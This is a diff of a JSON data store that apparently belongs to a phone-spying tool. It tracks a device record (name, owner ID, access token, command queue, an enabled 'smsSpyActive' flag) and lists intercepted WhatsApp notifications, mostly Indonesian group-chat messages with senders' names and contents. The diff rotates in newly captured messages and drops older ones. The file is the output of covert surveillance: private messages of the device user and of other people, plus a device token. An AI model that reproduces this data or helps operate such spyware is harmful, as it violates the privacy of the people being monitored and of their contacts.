@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775042951305,
+    "lastSeen": 1775042954523,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12695 pesan): ~ Bot",
+        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar jin, istana, dan huruf H.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
+        "time": "01/04 19:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042955339
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14947 pesan dari 9 chat",
+        "time": "01/04 19:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042953498
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12693 pesan): ~ 趙雨凡🌼",
+        "content": ". tebakgambar",
+        "time": "01/04 19:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042953395
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "01/04 19:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042424267
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14809 pesan dari 10 chat",
-        "time": "01/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042422532
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12514 pesan): ~ 🕷️",
-        "content": "otak gwe nge lag cok",
-        "time": "01/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042422488
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (4 pesan): ~ Call Me Zal7Sex",
-        "content": "🔗 TikTok · — Zal Infinity | penuhkan komen #Zal7Sex kalo mau apk ga maintenance😈\n\nlink video\nhttps://vt.tiktok.com/ZSHjYWLJT",
-        "time": "01/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042422415
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14947 pesan dari 9 chat",
+        "time": "01/04 19:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042953462
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12693 pesan): ~ 趙雨凡🌼",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042422571
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14809 pesan dari 10 chat",
-        "time": "01/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042422550
       }
     ],
     "galleryPhotos": [],
